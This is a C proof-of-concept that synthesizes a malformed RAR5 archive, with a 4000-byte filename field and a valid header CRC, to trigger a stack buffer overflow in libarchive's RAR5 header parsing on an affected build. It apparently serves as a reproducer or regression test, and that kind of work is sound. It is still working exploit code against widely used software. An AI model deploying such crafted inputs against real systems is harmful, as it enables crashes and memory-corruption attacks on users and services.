/*
 * Proof-of-concept for a RAR5 filename-length memory-safety defect.
 *
 * Drives the libarchive public API (archive_read_*) with an in-contract,
 * crafted RAR5 archive that declares a file whose name is 4000 bytes long.
 *
 * A well-formed RAR5 reader bounds the declared filename length against the
 * on-stack buffer it copies the name into before the copy.  On the affected
 * tree that bound and the buffer size disagree, so archive_read_next_header()
 * memcpy()s the 4000-byte name into a 2048-byte stack buffer -> stack buffer
 * overflow (AddressSanitizer aborts, SIGABRT / rc 134).
 *
 * On a correct tree the oversized name is rejected ("Filename is too long")
 * and this program exits cleanly.
 *
 * Self-contained: includes only the public headers and synthesizes the
 * archive bytes (including the required header CRC32) itself.
 */

#include <archive.h>
#include <archive_entry.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Standard CRC-32 (zlib/RFC 1952), matching libarchive's __archive_crc32. */
static uint32_t crc32_calc(const uint8_t *buf, size_t len)
{
	static uint32_t table[256];
	static int have_table = 0;
	uint32_t crc;
	size_t i;

	if (!have_table) {
		uint32_t c;
		int n, k;
		for (n = 0; n < 256; n++) {
			c = (uint32_t)n;
			for (k = 0; k < 8; k++)
				c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
			table[n] = c;
		}
		have_table = 1;
	}

	crc = 0xFFFFFFFFu;
	for (i = 0; i < len; i++)
		crc = table[(crc ^ buf[i]) & 0xFF] ^ (crc >> 8);
	return crc ^ 0xFFFFFFFFu;
}

/* Append a RAR5 base-128 varint (LE, high bit = continuation). */
static size_t put_var(uint8_t *out, uint64_t v)
{
	size_t n = 0;
	do {
		uint8_t b = (uint8_t)(v & 0x7F);
		v >>= 7;
		if (v)
			b |= 0x80;
		out[n++] = b;
	} while (v);
	return n;
}

int main(void)
{
	/* An ordinary (if long) RAR5 filename length: larger than the 2048
	 * MAX_NAME_IN_CHARS cap but well within the 8192-byte name buffer a
	 * correct reader allocates, so it exercises the length check. */
	const uint64_t NAME_LEN = 4000;

	static const uint8_t sig[8] = {
		0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00
	};

	uint8_t body[64 + 4000];
	size_t blen = 0;

	/* File header body (counted by raw_hdr_size). */
	blen += put_var(body + blen, 0x02);           /* header_id = HEAD_FILE */
	blen += put_var(body + blen, 0x02);           /* header_flags = HFL_DATA */
	blen += put_var(body + blen, 0x00);           /* data_size = 0 */
	blen += put_var(body + blen, 0x00);           /* file_flags = 0 */
	blen += put_var(body + blen, 0x00);           /* unpacked_size = 0 */
	blen += put_var(body + blen, 0x00);           /* file_attr = 0 */
	blen += put_var(body + blen, 0x00);           /* compression_info = 0 */
	blen += put_var(body + blen, 0x01);           /* host_os = HOST_UNIX */
	blen += put_var(body + blen, NAME_LEN);       /* name_size */
	memset(body + blen, 'A', (size_t)NAME_LEN);   /* name bytes */
	blen += (size_t)NAME_LEN;

	/* Header-size varint precedes the body; the CRC32 covers both. */
	uint8_t szv[10];
	size_t szlen = put_var(szv, (uint64_t)blen);

	uint8_t crcbuf[16 + 4000];
	size_t crclen = 0;
	memcpy(crcbuf + crclen, szv, szlen);  crclen += szlen;
	memcpy(crcbuf + crclen, body, blen);  crclen += blen;
	uint32_t hdr_crc = crc32_calc(crcbuf, crclen);

	/* Assemble: signature + u32(hdr_crc, LE) + header-size varint + body. */
	uint8_t archive[32 + 4000];
	size_t alen = 0;
	memcpy(archive + alen, sig, sizeof(sig)); alen += sizeof(sig);
	archive[alen++] = (uint8_t)(hdr_crc & 0xFF);
	archive[alen++] = (uint8_t)((hdr_crc >> 8) & 0xFF);
	archive[alen++] = (uint8_t)((hdr_crc >> 16) & 0xFF);
	archive[alen++] = (uint8_t)((hdr_crc >> 24) & 0xFF);
	memcpy(archive + alen, crcbuf, crclen); alen += crclen;

	struct archive *a = archive_read_new();
	if (a == NULL)
		return 2;
	archive_read_support_format_rar5(a);

	int r = archive_read_open_memory(a, archive, alen);
	if (r != ARCHIVE_OK) {
		fprintf(stderr, "open: %s\n", archive_error_string(a));
		archive_read_free(a);
		return 0;
	}

	struct archive_entry *entry;
	r = archive_read_next_header(a, &entry);
	if (r == ARCHIVE_OK)
		fprintf(stderr, "entry: %s\n", archive_entry_pathname(entry));
	else
		fprintf(stderr, "next_header (%d): %s\n", r,
		    archive_error_string(a));

	archive_read_free(a);
	return 0;
}
